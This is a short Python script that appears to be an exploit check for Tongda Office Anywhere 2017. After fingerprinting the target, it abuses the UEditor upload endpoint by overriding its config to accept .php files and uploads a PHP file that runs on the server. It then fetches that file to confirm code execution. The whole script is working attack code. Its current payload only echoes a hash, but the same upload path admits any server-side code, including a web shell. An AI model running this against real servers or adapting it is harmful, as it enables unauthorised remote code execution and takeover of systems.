import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=randomInt(40000, 44800)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
rboundary=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randname=randomLowercase(6)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"inc/expired.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Office Anywhere 2017" in response.text:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"module/ueditor/php/action_upload.php?action=uploadfile"
	body='''------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="CONFIG[fileFieldName]"
\r
ffff\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"\r
\r
1000000000\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="CONFIG[filePathFormat]"\r
\r
'''+randname+'''\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r
\r
.php\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="ffff"; filename="test.php"\r
Content-Type: application/octet-stream\r
\r
<?php echo md5('''+str(f1)+''');unlink(__FILE__);?>\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="mufile"\r
\r
submit\r
------WebKitFormBoundary'''+rboundary+'''--\r'''
	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+rboundary, 'X_requested_with': 'XMLHttpRequest'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
	else:
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+""+randname+".php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
